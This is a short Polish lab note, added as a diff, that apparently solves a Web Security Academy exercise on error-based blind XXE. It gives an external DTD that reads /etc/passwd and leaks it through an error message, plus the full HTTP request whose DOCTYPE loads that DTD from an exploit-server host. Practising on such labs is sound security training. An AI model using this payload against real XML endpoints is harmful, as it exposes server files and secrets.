@@ -1,0 +1,34 @@
+1. Mozemy uzyc zewnetrznego DTD aby wywolac komunikat o bledzie (jest na printscreenie)
+
+
+--------------------------------------------[Wystawiamy na zewnatrz na jakims serverze]
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+
+
+
+
+--------------------------------------------[I wykonujemy przykladowy request]
+POST /product/stock HTTP/1.1
+Host: 0a4b00630496af58c0786e6b005600c3.web-security-academy.net
+Cookie: session=6erBERvyJT4WNc1r2QGAWwXJOgdOR63s
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: 
+https://0a4b00630496af58c0786e6b005600c3.web-security-academy.net/product?productId=1
+Content-Type: application/xml
+Origin: https://0a4b00630496af58c0786e6b005600c3.web-security-academy.net
+Content-Length: 240
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ab1006604aeaf19c0586e8501270074.web-security-academy.net/exploit"> %xxe;]>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
